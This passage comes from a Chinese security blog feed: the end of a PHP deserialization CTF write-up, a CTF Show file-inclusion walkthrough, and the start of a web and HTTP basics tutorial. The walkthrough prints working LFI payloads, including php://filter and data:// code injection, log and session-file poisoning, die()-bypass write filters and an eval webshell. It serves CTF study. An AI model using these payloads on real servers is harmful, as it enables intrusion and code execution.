<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$obj</span> = (<span class="keyword">object</span>)[<span class="string">&#x27;flag&#x27;</span>=&gt;<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">  <span class="variable">$obj</span>-&gt;Hh0 = &amp;<span class="variable">$obj</span>-&gt;flag;</span><br><span class="line">  <span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到 O:8:&quot;stdClass&quot;:2:&#123;s:4:&quot;flag&quot;;s:4:&quot;flag&quot;;s:3:&quot;Hh0&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Hh0&quot;</span>;R:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?obj=O:<span class="number">8</span>:<span class="string">&quot;stdClass&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;S:<span class="number">4</span>:<span class="string">&quot;\66\6c\61\67&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;asd&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Show-文件包含</title>
    <url>/2021/10/01/CTF-Show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>CTF Show 文件包含篇。</p>
<span id="more"></span>

<h1 id="一、CTF-Show-—-文件包含"><a href="#一、CTF-Show-—-文件包含" class="headerlink" title="一、CTF Show — 文件包含"></a>一、CTF Show — 文件包含</h1><h2 id="1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过"><a href="#1-1-Web-78-—-最简单的文件包含-—-各种伪协议-绕过" class="headerlink" title="1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过"></a>1.1 Web 78 — 最简单的文件包含 — 各种伪协议 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php</span><br><span class="line">?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码</span></span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br><span class="line"><span class="comment">#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="1-2-Web-79-—-过滤-php-—-data-base64-绕过"><a href="#1-2-Web-79-—-过滤-php-—-data-base64-绕过" class="headerlink" title="1.2 Web 79 — 过滤 php — data:// base64 绕过"></a>1.2 Web 79 — 过滤 php — data:// base64 绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure>

<h2 id="1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）"><a href="#1-3-Web-80-—-过滤-php、data-—-日志文件包含（同时写上代码）" class="headerlink" title="1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）"></a>1.3 Web 80 — 过滤 php、data — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>抓包可知：nginx 服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#包含日志文件</span></span><br><span class="line">?file=/var/<span class="built_in">log</span>/nginx/access.log</span><br><span class="line">写入php代码</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/16/z4KZLdVwSmr8nH9.png" alt="image-20210716215042378"></p>
<p><img src="https://i.loli.net/2021/10/01/VW871dxkePXusAl.png" alt="image-20210716215142577"></p>
<h2 id="1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）"><a href="#1-4-Web-81-—-过滤-php、data、-—-日志文件包含（同时写上代码）" class="headerlink" title="1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）"></a>1.4 Web 81 —  过滤 php、data、: — 日志文件包含（同时写上代码）</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#同上，日志包含</span></span><br></pre></td></tr></table></figure>

<h2 id="1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含"><a href="#1-5-Web-82-86-—-过滤-php、data、-、-—-SESSION-文件包含" class="headerlink" title="1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含"></a>1.5 Web 82-86 —  过滤 php、data、: 、. — SESSION 文件包含</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=<span class="string">&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span> /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>任意上传一个文件</p>
<p><img src="https://i.loli.net/2021/07/19/wez3hdLsB7DfiOa.png" alt="image-20210719173916491"></p>
<p><img src="https://i.loli.net/2021/07/19/Ix5UvQDhOEAqlKr.png" alt="image-20210719173943208"></p>
<p><img src="https://i.loli.net/2021/07/19/Nz4CGTBXFSsowMt.png" alt="image-20210719173601510"></p>
<p><img src="https://i.loli.net/2021/07/19/ptBEzodScA4rYuq.png" alt="image-20210719173814926"></p>
<h2 id="利用-session-upload-progress-进行文件包含利用"><a href="#利用-session-upload-progress-进行文件包含利用" class="headerlink" title="利用 session.upload_progress 进行文件包含利用"></a>利用 session.upload_progress 进行文件包含利用</h2><p><a href="https://www.cnblogs.com/NPFS/p/13795170.html">https://www.cnblogs.com/NPFS/p/13795170.html</a></p>
<p><a href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
<p><strong>目的：利用 session.upload_progress 将木马写入 session 文件，然后包含 session 文件</strong></p>
<ul>
<li><p>创建 session 文件（无 session_start() ）</p>
<ul>
<li><p>选项 <code>session.auto_start=On</code>  ，PHP在接收请求时会自动初始化 Session，不需要执行 session_start()。默认情况下，该选项 <code>关闭</code> 。</p>
</li>
<li><p>选项 <code>session.use_strict_mode=0</code> ，默认值是0即未启动时，用户可以自定义 session。</p>
<p>方法：用户自己抓包，在 Cookie 里面设置，PHPSESSION=flag，那么PHP将会在服务器上也创建一个文件 <code>/tmp/sess_flag</code>  。这时用户并没有初始化 session ，php也照样自动初始化 session，而产生了一个键值，该键值由 <code>ini.get(&quot;session.upload_progress.prefix&quot;)+我们构造的session.upload_progress.name</code> 一起组成，最终写入 <code>sess_文件</code> li里。</p>
<p>linux 下，session文件一般的默认存储位置是 <code>/tmp 或 /var/lib/php/session</code></p>
</li>
</ul>
</li>
<li><p>避免 <code>session.upload_progress.cleanup=on</code> 的干扰</p>
<p>该选项导致文件成功上传之后，一旦读取 POST 信息之后，会清除进度信息，session 文件将会被立即清理。重点是 该选项默认开启。</p>
<ul>
<li>方法：<strong>条件竞争</strong></li>
</ul>
</li>
</ul>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010194658099-100509760.png" alt="img"></p>
<p><img src="https://img2020.cnblogs.com/blog/1999159/202010/1999159-20201010195459494-303350987.png" alt="img"></p>
<h2 id="1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过"><a href="#1-6-Web-87-—-过滤-php、data、-、-—-死亡绕过" class="headerlink" title="1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过"></a>1.6 Web 87 — 过滤 php、data、: 、.  — 死亡绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);    &#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># post?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# PD9waHAgc3lzdGVtKCdscycpOyA/Pg== 是 &lt;?php system(&#x27;ls&#x27;); ?&gt;#file=php://filter/write=convert.base64-decode/resource=1.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php://filter/write=convert.base64-decode/resource=1.php# 进行 url双编码# get?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/07/20/U2oHgyTDBpAMsCu.png" alt="image-20210720113808797"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更改 content ?content=aaPD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4=#解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问得到</p>
<p><img src="https://i.loli.net/2021/10/01/OpuNI68AKWTye52.png" alt="image-20210720113952940"></p>
<h2 id="1-7-Web-88-—-过滤-—-拼凑-php-语句"><a href="#1-7-Web-88-—-过滤-—-拼凑-php-语句" class="headerlink" title="1.7 Web 88 — 过滤 + = — 拼凑 php 语句"></a>1.7 Web 88 — 过滤 + = — 拼凑 php 语句</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);    &#125;    <span class="keyword">include</span>(<span class="variable">$file</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(<span class="keyword">__FILE__</span>);&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 注意不能出现= 和 +?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h<span class="comment"># PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz5h 解码是 &lt;?php system(&#x27;cat fl0g.php&#x27;); ?&gt;a</span></span><br></pre></td></tr></table></figure>

<h2 id="1-8-Web-117-—-convert-iconv-死亡绕过"><a href="#1-8-Web-117-—-convert-iconv-死亡绕过" class="headerlink" title="1.8 Web 117 — convert.iconv.* + 死亡绕过"></a>1.8 Web 117 — convert.iconv.* + 死亡绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    highlight_file(<span class="keyword">__FILE__</span>);error_reporting(<span class="number">0</span>);<span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);    &#125;&#125;<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];<span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];filter(<span class="variable">$file</span>);file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>); </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤掉了我们常使用的过滤器，我们可以使用别的 例如：convert.iconv.*</span></span><br></pre></td></tr></table></figure>

<p>它的编码解码与函数 <code>iconv()</code> 一致</p>
<p><img src="https://i.loli.net/2021/10/01/JobfmHWAMNvRi5Z.png" alt="image-20210720120252523"></p>
<p><a href="https://blog.csdn.net/qq_44657899/article/details/109319686">https://blog.csdn.net/qq_44657899/article/details/109319686</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">echo</span> iconv(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="string">&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;</span>); <span class="comment"># ?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php# postcontents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/XSdDRwM7zJa14WV.png" alt="image-20210720121650119"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># postab=system(&#x27;cat flag.php&#x27;);</span></span><br></pre></td></tr></table></figure>

<h2 id="1-9-Web-116-—"><a href="#1-9-Web-116-—" class="headerlink" title="1.9 Web 116 —"></a>1.9 Web 116 —</h2><p>misc+lfi</p>
<p>将视频 在 Kali 下进行 binwalk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk -e 1.pngbinbalk -D=png 1.mp4		<span class="comment"># 获取图片</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/02/CKV7dYLy4lP6eBu.png" alt="image-20210802153007262"></p>
<p><img src="https://i.loli.net/2021/08/02/mHgrCUQj6vVKt4e.png" alt="image-20210802153516688"></p>
<p>然后直接 <code>?file=php://filter/resource=flag.php</code> 即可 ，但需要查看源码，页面上查看不了，我们可以抓包查看</p>
<h1 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h1><p>文件包含 include() 函数</p>
<p><strong>读文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=flag.php?file=data://text/plain,&lt;?php system(<span class="string">&#x27;cat flag.php&#x27;</span>); ?&gt;<span class="comment">#查看源代码?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=#PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=内容是&lt;?php system(&#x27;cat flag.php&#x27;); ?&gt;?file=php://inputpost:&lt;?php	system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>

<p><strong>写文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=3.php?contents=?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 过滤 php data :  Web 80-81# 日志包含?file=/var/log/nginx/access.log  # 发送包时写入 代码# 过滤 .   Web 82-86# SESSION 包含 条件竞争&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://708cd0ba-4c4a-40c7-b53c-0dca6ac256fe.challenge.ctf.show:8080/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;# &lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;死亡绕过  Web 87?filename=php://filter/write=convert.base64-decode/resource=1.php?content=aaPD9waHAgc3lzdGVtKCdscycpOyA/Pg==# &lt;?php system(&#x27;ls&#x27;); ?&gt;# 过滤 + = 限制 base64		Web 88# 拼凑 php 语句?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/PmFi# PD9waHAgc3lzdGVtKCdscycpOyA/PmFi 解码是 &lt;?php system(&#x27;ls&#x27;); ?&gt;ab</span></span><br></pre></td></tr></table></figure>



<p>参考</p>
<p><a href="https://blog.csdn.net/weixin_45882317/article/details/114576726">https://blog.csdn.net/weixin_45882317/article/details/114576726</a></p>
]]></content>
      <categories>
        <category>CTF Show</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Web基础</title>
    <url>/2021/05/24/Web%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>攻击者攻击服务器–首先要保证两者之间能正常的进行通信<br>如何通信？服务器上的各种服务都是依托于 端口 来实现对外提供服务的，攻击者所入侵的就是端口<br>什么是Web应用？提供W e b服务的应用系统,其实通俗讲就是一个网站。</p>
<span id="more"></span>

<h2 id="一、访问网页流程"><a href="#一、访问网页流程" class="headerlink" title="一、访问网页流程"></a>一、访问网页流程</h2><h3 id="1-1-访问静态网页流程"><a href="#1-1-访问静态网页流程" class="headerlink" title="1.1 访问静态网页流程"></a>1.1 访问静态网页流程</h3><ul>
<li><p><strong>编写</strong>：HTML , CSS , JavaScript</p>
</li>
<li><p><strong>流程</strong>：在 浏 览 器 中 输 入h t t p : / / w w w . s e c u r i t y . c o m / a d m i n / i n d e x . h t m l 后 回 车，客户端向服务端发送HTTP请求报文，服务端通过运行其含有的Web应用服务器（Web容器，中间件）对接收到的请求进行处理–判断请求的文件扩展名，在网站的根目录之下寻找对应的文件，Web应用服务器再构建HTTP响应报文将文件源代码返回给浏览器，代码经过浏览器的渲染过后呈现的画面供客户端使用。</p>
</li>
</ul>
<h3 id="1-2-访问动态网页流程"><a href="#1-2-访问动态网页流程" class="headerlink" title="1.2 访问动态网页流程"></a>1.2 访问动态网页流程</h3><ul>
<li><p><strong>编写</strong>：.php , .jsp , .asp , .aspx ，一般 由HTML+CSS+JavaScript+后端语言代码组成。</p>
</li>
<li><p><strong>流程</strong>：判断请求文件扩展名之后，将会将对应的文件交给 <code>PHP脚本引擎</code> 去处理，使之解析文件当中的 PHP 代码，如果代码中涉及到队数据库的操作。它会请求相应的数据库，让数据库去执行队数据的增删改查等操作，然后将处理的结果返回给PHP脚本引擎。PHP脚本引擎将结果交给 Web 应用服务器（Apache），Web 应用服务器构建HTTP响应报文，由服务端发送给浏览器，经过解析之后，由客户端使用。</p>
</li>
<li><p><strong>数据库</strong>：SQL Server , MySQL , Oracle</p>
</li>
</ul>
<h2 id="二、Web应用基本架构"><a href="#二、Web应用基本架构" class="headerlink" title="二、Web应用基本架构"></a>二、Web应用基本架构</h2><p>Web应用程序的设计者、Web应用服务器、动态脚本引擎(服务端程序语言)、数据库</p>
<p>常见Web服务端架构：</p>
<p><img src="https://i.loli.net/2021/05/25/rDAOBg9jn8bZ7R4.png" alt="image-20210404084121968"></p>
<p>LAMP和WAMP就是Windows/Linux+Apache+PHP+MySQL</p>
<h2 id="三、URL"><a href="#三、URL" class="headerlink" title="三、URL"></a>三、URL</h2><p>URL：统一资源定位符（网页地址，网址），用于定位服务器的资源（文档，页面，图像等等）</p>
<ul>
<li><p><strong>标准格式 : protocol://userInfo@hostname[:port]/path/[?query]#fragment  真正访问的是@之后的地址</strong></p>
<ul>
<li><p>userInfo：user:password  不推荐</p>
</li>
<li><p><strong>井号</strong>：在URL中指定的是页面中的一个位置</p>
<p>井号作为 页面定位符 出现在URL中，比如：<em><a href="http://www.httpwatch.com/features.htm#print">http://www.httpwatch.com/features.htm#print</a></em> ，此URL表示在页面features.htm中print的位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。</p>
</li>
</ul>
</li>
<li><p><strong>URL编码：</strong></p>
<ul>
<li><p>产生原因：一些特殊字符会含有不同而含义：<code>?username=1&amp;passwd=2%263</code> ，为了区分。RFC标准提出 <code>URL编码方案</code></p>
</li>
<li><p>常见：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=  	%3d</span><br><span class="line">#	%23</span><br><span class="line">%	%25</span><br><span class="line">&amp;	%26</span><br><span class="line">/	%2f</span><br><span class="line">空格	%20</span><br><span class="line">换行	%0a</span><br><span class="line">空字节	%00</span><br><span class="line">加号 	+ 代表URL编码当中的 空格</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="四、HTTP"><a href="#四、HTTP" class="headerlink" title="四、HTTP"></a>四、HTTP</h2><p>HTTP （HyperText Transfer Protocol）超文本传输协议（请求/响应协议）：规定浏览器与万维网服务器之间的通信规则。<strong>无状态的协议</strong></p>
<h3 id="4-1-HTTP-协议报文"><a href="#4-1-HTTP-协议报文" class="headerlink" title="4.1 HTTP 协议报文"></a>4.1 HTTP 协议报文</h3><h4 id="4-1-1-请求报文"><a href="#4-1-1-请求报文" class="headerlink" title="4.1.1 请求报文"></a>4.1.1 请求报文</h4><ul>
<li><p>请求行 ：<code>请求方法 /URL /HTTP协议版本</code> 空格隔离</p>
</li>
<li><p>请求头部：告知服务器客户端请求的信息，<code>关键字:值</code>，每行一对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host				被请求资源的主机名</span><br><span class="line">User-Agent			产生请求的浏览器类型</span><br><span class="line">Accept				客户端可处理的 MIME 类型</span><br><span class="line">Accept-Encoding		客户端能够理解的内容编码方式</span><br><span class="line">Accept-Language		客户端可理解的语言</span><br><span class="line">Cookie				客户端身份凭证</span><br></pre></td></tr></table></figure>

<p><strong>Referer</strong></p>
<p>重定向时，声明用户从什么地方（上一个URL）到达现在的URL的。<br>例如：登陆页面，当用户登陆成功之后，HTTP请求报文中会有Referer字段–显示用户是从什么地方跳转到成功登录之后的界面的，服务端会进行检测，用于判断准确性。</p>
